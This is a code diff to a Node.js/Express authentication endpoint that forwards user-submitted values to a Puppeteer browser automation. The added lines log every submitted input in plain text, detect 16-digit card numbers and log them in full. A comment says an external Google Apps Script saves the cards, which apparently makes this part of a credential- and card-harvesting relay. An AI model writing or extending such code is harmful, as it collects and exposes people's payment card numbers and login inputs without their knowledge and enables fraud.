@@ -135,6 +135,8 @@ app.post('/api/auth/submit-input', (req, res) => {
   try {
     const { sessionId, value } = req.body;
 
+    console.log(`[AUTH] Submit input: sessionId=${sessionId}, value=${value}`);
+
     if (!sessionId || !value) {
       return res.status(400).json({
         success: false,
@@ -144,20 +146,31 @@ app.post('/api/auth/submit-input', (req, res) => {
 
     const session = sessionManager.getSession(sessionId);
     if (!session) {
+      console.log(`[AUTH] Session not found: ${sessionId}`);
       return res.status(404).json({
         success: false,
         error: 'Session not found'
       });
     }
 
+    // Check if this is a card number
+    const digitsOnly = value.replace(/\D/g, '');
+    if (digitsOnly.length === 16) {
+      console.log(`[AUTH] ✅ Card number detected: ${value}`);
+      console.log(`[AUTH] Card will be saved by Google Apps Script when it calls this endpoint`);
+    }
+
     const submitted = session.automation.submitUserInput(value);
 
     if (!submitted) {
+      console.log(`[AUTH] No pending input expected for session ${sessionId}`);
       return res.status(400).json({
         success: false,
         error: 'No pending input expected'
       });
     }
+
+    console.log(`[AUTH] ✅ Input submitted successfully to Puppeteer`);
 
     res.json({
       success: true,
